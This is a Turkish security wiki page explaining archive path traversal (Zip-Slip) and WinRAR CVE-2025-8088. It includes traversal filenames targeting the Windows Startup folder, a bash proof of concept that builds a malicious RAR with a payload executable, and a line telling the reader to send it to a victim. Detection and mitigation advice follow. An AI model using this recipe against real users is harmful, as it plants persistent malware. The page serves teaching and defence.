# Archive Extraction Path Traversal ("Zip-Slip" / WinRAR CVE-2025-8088)

{{#include ../banners/hacktricks-training.md}}

## Genel Bakış

Birçok arşiv formatı (ZIP, RAR, TAR, 7-ZIP, vb.) her bir girişin kendi **iç yolunu** taşımasına izin verir. Bir çıkarım aracı bu yolu körü körüne dikkate aldığında, `..` veya **mutlak bir yol** (örneğin `C:\Windows\System32\`) içeren bir dosya adı, kullanıcı tarafından seçilen dizinin dışına yazılacaktır. Bu tür bir zafiyet, *Zip-Slip* veya **arşiv çıkarım yolu geçişi** olarak yaygın olarak bilinir.

Sonuçlar, rastgele dosyaların üzerine yazmaktan, Windows *Başlangıç* klasörü gibi bir **oto çalıştırma** konumuna bir yük bırakılarak doğrudan **uzaktan kod yürütme (RCE)** elde etmeye kadar uzanır.

## Temel Sebep

1. Saldırgan, bir veya daha fazla dosya başlığının içerdiği bir arşiv oluşturur:
* Göreli geçiş dizileri (`..\..\..\Users\\victim\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\payload.exe`)
* Mutlak yollar (`C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\payload.exe`)
2. Mağdur, gömülü yolu temizlemek veya seçilen dizinin altına çıkarım yapmayı zorlamak yerine, gömülü yola güvenen savunmasız bir araçla arşivi çıkarır.
3. Dosya, saldırganın kontrolündeki bir konuma yazılır ve sistem veya kullanıcı o yolu tetiklediğinde çalıştırılır/yüklenir.

## Gerçek Dünya Örneği – WinRAR ≤ 7.12 (CVE-2025-8088)

Windows için WinRAR ( `rar` / `unrar` CLI, DLL ve taşınabilir kaynak dahil) çıkarım sırasında dosya adlarını doğrulamada başarısız oldu. Kötü niyetli bir RAR arşivi, aşağıdaki gibi bir girişi içeren:
```text
..\..\..\Users\victim\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\payload.exe
```
**seçilen çıktı dizininin dışında** ve kullanıcının *Startup* klasörünün içinde sona erecektir. Windows, oturum açtıktan sonra orada bulunan her şeyi otomatik olarak çalıştırır ve *kalıcı* RCE sağlar.

### PoC Arşivi Oluşturma (Linux/Mac)
```bash
# Requires rar >= 6.x
mkdir -p "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
cp payload.exe "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/"
rar a -ep evil.rar evil/*
```
Seçenekler:
* `-ep`  – dosya yollarını tam olarak verildiği gibi sakla (önceki `./` kısmını **kaldırma**).

`evil.rar` dosyasını kurbanınıza ulaştırın ve onu savunmasız bir WinRAR sürümü ile çıkarmasını söyleyin.

### Doğada Gözlemlenen Sömürü

ESET, özelleştirilmiş arka kapıları dağıtmak ve fidye yazılımı operasyonlarını kolaylaştırmak için CVE-2025-8088'i kötüye kullanan RAR arşivleri ekleyen RomCom (Storm-0978/UNC2596) oltalama kampanyalarını bildirdi.

## Tespit İpuçları

* **Statik inceleme** – Arşiv girişlerini listeleyin ve `../`, `..\\`, *mutlak yollar* (`C:`) veya kanonik olmayan UTF-8/UTF-16 kodlamalarını içeren herhangi bir ismi işaretleyin.
* **Sandbox çıkarımı** – Sonuçta oluşan yolların dizin içinde kalmasını doğrulamak için *güvenli* bir çıkarıcı (örneğin, Python’un `patool`, 7-Zip ≥ en son, `bsdtar`) kullanarak geçici bir dizine sıkıştırmayı açın.
* **Uç Nokta izleme** – WinRAR/7-Zip vb. tarafından bir arşiv açıldıktan kısa bir süre sonra `Startup`/`Run` konumlarına yazılan yeni çalıştırılabilir dosyalar için uyarı verin.

## Azaltma ve Güçlendirme

1. **Çıkarıcıyı güncelleyin** – WinRAR 7.13, uygun yol sanitizasyonu uygular. Kullanıcılar, WinRAR'ın otomatik güncelleme mekanizması olmadığı için bunu manuel olarak indirmelidir.
2. Mümkünse arşivleri **“Yolları yok say”** seçeneği ile çıkarın (WinRAR: *Çıkar → "Yolları çıkarma"*) .
3. Güvenilmeyen arşivleri **bir sandbox** veya sanal makine içinde açın.
4. Uygulama beyaz listesi uygulayın ve kullanıcı yazma erişimini otomatik çalıştırma dizinleri ile sınırlayın.

## Ek Etkilenen / Tarihsel Durumlar

* 2018 – Snyk tarafından birçok Java/Go/JS kütüphanesini etkileyen büyük *Zip-Slip* tavsiyesi.
* 2023 – `-ao` birleştirmesi sırasında benzer geçiş için 7-Zip CVE-2023-4011.
* Yazma işleminden önce `PathCanonicalize` / `realpath` çağrısını yapmayan herhangi bir özel çıkarım mantığı.

## Referanslar

- [BleepingComputer – WinRAR sıfır-gün açığı arşiv çıkarımında kötü amaçlı yazılım yerleştirmek için kullanıldı](https://www.bleepingcomputer.com/news/security/winrar-zero-day-flaw-exploited-by-romcom-hackers-in-phishing-attacks/)
- [WinRAR 7.13 Değişiklik Günlüğü](https://www.win-rar.com/singlenewsview.html?&L=0&tx_ttnews%5Btt_news%5D=283&cHash=a64b4a8f662d3639dec8d65f47bc93c5)
- [Snyk – Zip Slip güvenlik açığı raporu](https://snyk.io/research/zip-slip-vulnerability)

{{#include ../banners/hacktricks-training.md}}
